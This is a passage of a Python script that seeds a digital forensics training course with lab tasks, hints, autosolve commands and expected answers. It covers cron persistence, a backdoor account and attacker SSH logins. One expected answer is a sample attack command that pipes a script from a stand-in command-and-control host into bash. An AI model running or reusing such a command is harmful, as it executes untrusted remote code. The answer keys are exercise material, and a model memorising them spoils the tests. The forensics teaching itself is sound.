                    "List cron jobs using crontab -l",
                    "Read the suspicious script path from the cron entry",
                ],
            },
            {
                "title": "Task 6 - Evidence: Decoded Payload Command",
                "instructions": "Decode encoded_payload.txt. What full shell command does it contain?",
                "expected_answer": "curl http://evil-c2.io/stage2.sh | bash",
                "autosolve_commands": ["base64 -d encoded_payload.txt"],
                "hints": [
                    "Decode the file using base64 -d encoded_payload.txt",
                    "The decoded content is a single shell command",
                    "Read the full output line carefully",
                ],
            },
            {
                "title": "Task 7 - Evidence: Backdoor Username",
                "instructions": "Which suspicious username exists in /etc/passwd with shell access?",
                "expected_answer": "sysbackup",
                "autosolve_commands": [
                    "cat /etc/passwd | grep -v nologin | grep -v false"
                ],
                "hints": [
                    "Display shell-enabled accounts using cat /etc/passwd | grep -v nologin",
                    "Exclude disabled shells using grep -v false",
                    "Identify the unusual non-system username in the output",
                ],
            },
            {
                "title": "Task 8 - Evidence: Attacker IP Address",
                "instructions": "What external IP address had a successful SSH login in auth.log?",
                "expected_answer": "185.220.101.45",
                "autosolve_commands": ['grep "Accepted" auth.log'],
                "hints": [
                    "Search successful logins using grep \"Accepted\" auth.log",
                    "Look for the remote IP address in the log entry",
                    "Identify the external IP associated with the login",
                ],
            },
            {
                "title": "Task 9 - Evidence: Login Username",
                "instructions": "What username did the attacker use to log in via SSH?",
                "expected_answer": "root",
                "autosolve_commands": ['grep "Accepted" auth.log'],
                "hints": [
                    "Search successful SSH logins using grep \"Accepted\" auth.log",
                    "Look for the username in the matching log line",
                    "The username appears after the word \"for\" in the log entry",
                ],
            },
        ],
    },
]


# ── Seeder ─────────────────────────────────────────────────────────────────────

async def seed():
    force = "--force" in sys.argv

    async with async_session() as db:
        # Check if course already exists
        existing = await db.execute(
            select(Course).where(Course.title == COURSE_TITLE)
        )
        existing_course = existing.scalar_one_or_none()
        if existing_course:
            if not force:
                print(f"[skip] Course '{COURSE_TITLE}' already exists.")
                print(f"       Run with --force to delete it and re-seed (this also resets all student progress).")
                return
            print(f"[force] Deleting existing course '{COURSE_TITLE}' and all related data...")
            await db.delete(existing_course)
            await db.commit()
            print(f"[ok] Deleted. Re-seeding...")

        # Find an admin user to set as creator
        admin_result = await db.execute(
            select(User).where(User.role.in_(["admin", "system_admin"])).limit(1)
        )
        admin = admin_result.scalar_one_or_none()
        if not admin:
            print("[error] No admin user found. Create an admin user first.")
            print("        Register a user at /api/auth/register then update their role in the DB:")
            print("        UPDATE users SET role='admin' WHERE email='your@email.com';")
            return

        print(f"[info] Using admin: {admin.email} ({admin.user_id})")

        # Create course
        course = Course(
            created_by=admin.user_id,
            **COURSE,
        )
        db.add(course)
        await db.flush()
        print(f"[ok] Created course: {course.title} (id={course.course_id})")

        # Create labs and tasks
        for lab_data in LABS:
            tasks_data = lab_data["tasks"]
            runtime_slug = lab_data["runtime_slug"]

            docker_config = {
                "runtime_slug": runtime_slug,
                "terminal_type": runtime_slug if runtime_slug else "none",
            }

            lab = Lab(
                course_id=course.course_id,
                docker_compose_config=docker_config,
                is_published=True,
                title=lab_data["title"],
                description=lab_data["description"],
                difficulty=lab_data["difficulty"],
                has_auto_solve=lab_data["has_auto_solve"],
                sort_order=lab_data["sort_order"],
            )
            db.add(lab)
            await db.flush()
            print(f"  [ok] Created lab: {lab.title} (id={lab.lab_id})")

            for sort_idx, task_data in enumerate(tasks_data):
                task = LabTask(
                    lab_id=lab.lab_id,
                    sort_order=sort_idx,
                    title=task_data["title"],
                    instructions=task_data["instructions"],
                    expected_answer=task_data.get("expected_answer"),
                    autosolve_commands=task_data.get("autosolve_commands", []),
                )
                db.add(task)
                await db.flush()

                for hint_idx, hint_text in enumerate(task_data.get("hints", [])):
                    hint = Hint(
                        task_id=task.task_id,
                        hint_text=hint_text,
                        hint_order=hint_idx + 1,
                        delay_minutes=0,  # No delay — students can unlock freely
                    )
                    db.add(hint)

            await db.flush()

        await db.commit()
        total_tasks = sum(len(ld["tasks"]) for ld in LABS)
        print(f"\n[done] Digital Forensics course seeded successfully!")
        print(f"       Course ID: {course.course_id}")
        print(f"       Labs: {len(LABS)}, Tasks: {total_tasks}")


if __name__ == "__main__":
    # Restore tasks data after pops (since we modify in place)
    # Re-import to get fresh data
    asyncio.run(seed())
